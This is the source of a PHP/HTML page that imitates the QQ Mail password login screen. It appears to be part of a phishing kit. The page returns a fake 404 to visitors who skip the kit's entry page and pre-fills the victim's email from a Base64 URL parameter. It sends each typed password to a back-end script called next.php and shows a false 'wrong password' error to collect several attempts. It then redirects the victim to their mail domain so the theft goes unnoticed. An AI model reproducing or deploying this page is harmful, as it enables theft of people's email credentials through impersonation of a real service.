<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>登录QQ邮箱</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="navmailqq" style="height: 66px;background: #eff4fa;padding-left: 12px;padding-right: 12px;padding-top: 12px;padding-bottom: 12px;"><img class="img-fluid" width="182" height="35" src="../assets/img/qqmail_logo_default_35h.e071fb4.png"></div>
    <div id="mainmailqq" class="c-div">
        <div id="formouterqq" style="width: 100%;max-width: 370px;margin-top: 30px;border: 1px solid rgb(129,129,129);border-radius: 3px;padding-bottom: 24px;">
            <div class="sp-div" style="height: 50px;border-bottom: 1px solid rgb(187,187,187) ;">
                <div style="width: 50%;">
                    <p style="text-align: center;margin-top: 14px;color: rgb(121,121,121);">微信登录 </p>
                </div>
                <div style="width: 50%;border-left: 1px solid rgb(179,179,179) ;">
                    <p style="text-align: center;margin-top: 14px;color: rgb(121,121,121);">QQ登录 </p>
                </div>
            </div>
            <p style="text-align: center;margin-top: 16px;margin-bottom: 8px;">密码登录</p>
            <p style="text-align: center;margin-bottom: 32px;">推荐使用<a href="#">快捷登录</a>，防止盗号。</p>
            <div class="c-div"><input type="text" id="backEMF" style="height: 38px;width: 100%;max-width: 250px;padding: 1px 8px;border: 1px solid #adadad ;"></div>
            <div class="c-div"><input type="password" id="pass" style="height: 38px;width: 100%;max-width: 250px;padding: 1px 8px;margin-top: 8px;border: 1px solid #adadad ;" placeholder="请输入密码"></div>
            <div class="c-div">
                <div style="width: 100%;max-width: 250px;">
                    <p id="err" style="margin-bottom: 16px;margin-top: 8px;color: rgb(211,0,0);text-align: left;">密码错误，请重试</p>
                </div>
            </div>
            <div class="c-div"><button class="btn btn-primary" id="next-btn" type="button" style="width: 99%;max-width: 250px;height: 38px;border-style: none;border-radius: 0px;margin-top: 16px;" onclick="nextFun();">登录</button></div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>